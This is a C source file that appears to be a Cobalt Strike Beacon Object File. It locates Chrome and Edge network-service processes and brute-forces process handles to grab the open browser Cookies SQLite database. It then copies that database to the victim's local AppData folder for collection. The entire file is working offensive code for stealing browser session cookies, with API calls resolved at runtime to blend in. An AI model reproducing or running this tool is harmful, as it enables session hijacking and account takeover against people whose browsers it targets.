#include <windows.h>
#include <winternl.h>
#include <Shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include "beacon.h"

#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }
#define IMPORT_RESOLVE FARPROC GlobalAlloc = Resolver("kernel32", "GlobalAlloc"); \
    FARPROC OpenProcess = Resolver("kernel32", "OpenProcess"); \
    FARPROC NtQueryInformationProcess = Resolver("ntdll", "NtQueryInformationProcess"); \
    FARPROC ReadProcessMemory = Resolver("kernel32", "ReadProcessMemory"); \
    FARPROC wcsstr = Resolver("msvcrt", "wcsstr"); \
    FARPROC GlobalFree = Resolver("kernel32", "GlobalFree"); \
    FARPROC memcpy = Resolver("msvcrt", "memcpy"); \
    FARPROC memset = Resolver("msvcrt", "memset"); \
    FARPROC CreateToolhelp32Snapshot = Resolver("kernel32", "CreateToolhelp32Snapshot");  \
    FARPROC GetLastError = Resolver("kernel32", "GetLastError");  \
    FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA");  \
    FARPROC PathAppend = Resolver("shlwapi", "PathAppendA");  \
    FARPROC Process32First = Resolver("kernel32", "Process32First");  \
    FARPROC Process32Next = Resolver("kernel32", "Process32Next");  \
    FARPROC strlen = Resolver("msvcrt", "strlen"); \
    FARPROC strcmp = Resolver("msvcrt", "strcmp"); \
    FARPROC strstr = Resolver("msvcrt", "strstr"); \
    FARPROC strncpy = Resolver("msvcrt", "strncpy"); \
    FARPROC sprintf = Resolver("msvcrt", "sprintf"); \
    FARPROC CreateFile = Resolver("kernel32", "CreateFileA"); \
    FARPROC GetFileSize = Resolver("kernel32", "GetFileSize"); \
    FARPROC ReadFile = Resolver("kernel32", "ReadFile"); \
    FARPROC CloseHandle = Resolver("kernel32", "CloseHandle"); \
    FARPROC GetFileAttributes = Resolver("kernel32", "GetFileAttributesA"); \
    FARPROC DuplicateHandle = Resolver("kernel32", "DuplicateHandle"); \
    FARPROC GetFinalPathNameByHandle = Resolver("kernel32", "GetFinalPathNameByHandleA"); \
    FARPROC SetFilePointer = Resolver("kernel32", "SetFilePointer"); \
    FARPROC WriteFile = Resolver("kernel32", "WriteFile"); \
    FARPROC snprintf = Resolver("msvcrt", "_snprintf"); \
    FARPROC GetCurrentProcess = Resolver("kernel32", "GetCurrentProcess");

DECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);
DECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);

FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);
    //printf("%s$%s located at 0x%p\n", lib, func, ptr);

    return ptr;

}

BOOL IsNetworkService(DWORD PID);
VOID GetProcessPIDByName(CHAR *processName);
VOID CopyDatabaseBruteForceHandleByPID(DWORD PID);

BOOL IsNetworkService(DWORD PID) {
    IMPORT_RESOLVE;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb;
    RTL_USER_PROCESS_PARAMETERS rupp;
    SIZE_T dwBytesRead = 0;

    NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

    ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(PEB), &dwBytesRead);
    ReadProcessMemory(hProc, peb.ProcessParameters, &rupp, sizeof(RTL_USER_PROCESS_PARAMETERS), &dwBytesRead);

    WCHAR *commandline = (WCHAR*)GlobalAlloc(GPTR, rupp.CommandLine.Length + 1);

    ReadProcessMemory(hProc, rupp.CommandLine.Buffer, commandline, rupp.CommandLine.Length, &dwBytesRead);
    CloseHandle(hProc);

    if(wcsstr(commandline, L"NetworkService")) {
       return TRUE;
    }
    return FALSE;
}

VOID GetProcessPIDByName(CHAR *processName) {
    IMPORT_RESOLVE;
    printf("Looking for process name %s\n", processName);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)) {
        do {
            if(strcmp(pe32.szExeFile, processName) == 0) {
                CopyDatabaseBruteForceHandleByPID(pe32.th32ProcessID);
            }
        } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}

VOID CopyDatabaseBruteForceHandleByPID(DWORD PID) {
    IMPORT_RESOLVE;
    DWORD i = 0x100;
    if(!IsNetworkService(PID)) {
        return;
    }
    printf("Process PID %d is the NetworkService aka the one with an handle to the cookie\n", PID);

    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
    if(hProc == INVALID_HANDLE_VALUE) {
        printf("Failed to get an handle on process PID %d\n", PID);
        return;
    }

    for(i; i < 0x1000; i++) {
        HANDLE hDuplicate = NULL;
        if(DuplicateHandle(hProc, (HANDLE)i, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
            CHAR filename[256];
            memset(filename, 0x00, 256);
            GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
            if(strstr(filename, "Cookies") != NULL && strstr(filename, "Cookies-journal") == NULL && strstr(filename, "Browsing Cookies") == NULL) {
                printf("Cookie SQLite db found %s\n", filename);

                CHAR appdata[256];
                DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
                DWORD dwRead = 0;
                CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);

                SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);

                printf("Cookie SQLite db file size is %d\n", dwFileSize);

                ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

                memset(filename, 0x00, 256);

                SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
                snprintf(filename, 256, "%s\\%d.db", appdata, PID);
                printf("File saved as %s\n", filename);

                HANDLE hFile = CreateFile(filename, GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                CloseHandle(hFile);
                GlobalFree(buffer);

                CloseHandle(hDuplicate);
                CloseHandle(hProc);
                return;
            }
        }
    }
    CloseHandle(hProc);
}


VOID go(char *argv, int argc) {
    GetProcessPIDByName("chrome.exe");
    GetProcessPIDByName("msedge.exe");
    printf("Process completed.\n");
}
